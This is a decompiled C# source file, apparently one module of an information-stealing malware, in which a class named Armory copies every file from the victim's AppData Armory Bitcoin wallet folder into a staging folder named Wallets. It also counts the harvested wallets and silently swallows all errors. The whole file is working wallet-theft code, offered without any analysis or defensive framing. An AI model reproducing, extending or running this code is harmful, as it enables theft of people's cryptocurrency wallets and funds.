﻿using System;
using System.IO;

namespace SHARP
{
	// Token: 0x0200002D RID: 45
	internal class Armory
	{
		// Token: 0x060000EF RID: 239 RVA: 0x00005D08 File Offset: 0x00003F08
		public static void ArmoryStr(string directorypath)
		{
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppData + "\\Armory\\").GetFiles())
				{
					Directory.CreateDirectory(directorypath + Armory.ArmoryDir);
					fileInfo.CopyTo(directorypath + Armory.ArmoryDir + fileInfo.Name);
				}
				Armory.count++;
				Counting.Wallets++;
			}
			catch
			{
			}
		}

		// Token: 0x04000075 RID: 117
		public static int count = 0;

		// Token: 0x04000076 RID: 118
		private static readonly string ArmoryDir = "\\Wallets\\Armory\\";
	}
}
